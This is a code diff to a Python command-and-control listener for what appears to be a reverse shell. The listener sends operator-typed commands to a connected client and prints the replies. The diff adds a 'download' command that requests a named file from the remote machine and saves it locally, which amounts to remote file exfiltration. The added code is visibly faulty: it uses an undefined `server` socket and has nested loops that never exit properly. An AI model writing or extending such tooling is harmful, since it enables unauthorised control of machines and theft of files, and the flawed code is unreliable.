@@ -41,14 +41,38 @@ def socket_accept():
 def send_commands(conn):
     while True:
         cmd = input()
-        if cmd == 'quit':
-            conn.close()
-            s.close()
-            sys.exit()
-        if len(str.encode(cmd)) > 0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1024), "utf-8")
-            print(client_response, end="")
+        if cmd == "download":
+            conn.send("ft".encode("utf-8"))
+            def recive_file(buffer):
+                while True:
+                    bff = conn.recv(buffer).decode("utf-8")
+                    break
+                if bff.startswith("#"):
+                    buff = int(bff.split("#", 2)[1])
+                    name = bff.split("#", 2)[2]
+                    while True:
+                        file = conn.recv(buff).decode("utf-8")
+                        break
+                    with open(name, "w") as f:
+                        f.write(file)
+                    print(file)
+                    return name
+            while True:
+                conn, addr = server.accept()
+                while True:
+                    file_to_transfer = str(input("[!] File to transfer: "))
+                    file_to_transfer = "(FT)#" + file_to_transfer
+                    conn.send(file_to_transfer.encode("utf-8"))
+                    recive_file(1024)
+        else:
+            if cmd == 'quit':
+                conn.close()
+                s.close()
+                sys.exit()
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(1024), "utf-8")
+                print(client_response, end="")
 
 
 def main():
